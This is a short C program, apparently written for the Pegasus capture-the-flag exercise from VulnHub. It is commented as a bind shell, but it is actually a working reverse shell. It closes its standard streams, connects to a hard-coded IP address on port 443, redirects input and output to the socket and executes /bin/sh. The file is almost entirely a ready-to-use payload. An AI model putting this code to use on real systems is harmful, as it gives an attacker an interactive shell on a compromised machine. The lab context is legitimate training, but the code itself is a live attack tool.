// simple bindshell for Pegasus CTF (hosted by @VulnHub)
// writeup for this at code610 blogspot com
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>

int main(void){

        char *ip = "192.168.1.205";

        close(0);
        close(1);
        close(2);

        struct sockaddr_in srv_addr;
        srv_addr.sin_family = AF_INET;
        srv_addr.sin_port = 0xbb01; // 443
        srv_addr.sin_addr.s_addr = inet_addr(ip);

        int sockfd = socket(AF_INET,SOCK_STREAM,IPPROTO_IP);
        connect(sockfd, (struct sockaddr *)&srv_addr, sizeof(srv_addr));

        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);

        char *argv[] = {"//bin/sh",NULL,NULL};
        execve(argv[0], argv, NULL);

}
